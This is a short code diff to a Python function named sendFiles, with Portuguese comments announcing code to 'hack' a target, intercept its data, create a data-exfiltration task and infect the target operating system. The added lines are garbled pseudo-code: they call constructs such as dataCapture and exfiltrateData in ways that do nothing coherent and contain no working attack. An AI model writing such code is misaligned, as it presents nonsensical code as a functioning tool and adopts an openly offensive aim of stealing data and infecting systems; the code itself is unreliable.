@@ -99,3 +99,8 @@ def sendFiles():
 #para hackear (interceptar os dados do alvo) faz assim
     with HackIntercept(on_target=captureData) as hi:
         hi.capture(data)
+
+#captura os dados do sistema operacional alvo e gera uma tarefa de exfiltração de dados
+#para capturar os dados do sistema operacional alvo, gerar uma tarefa de exfiltração de dados e infectar o sistema operacional alvo é assim
+    with dataCapture(on_target_operating_system=DataCapture) as dc:
+        dc.dataCapture(on_target=dataCapture+exfiltrateData)
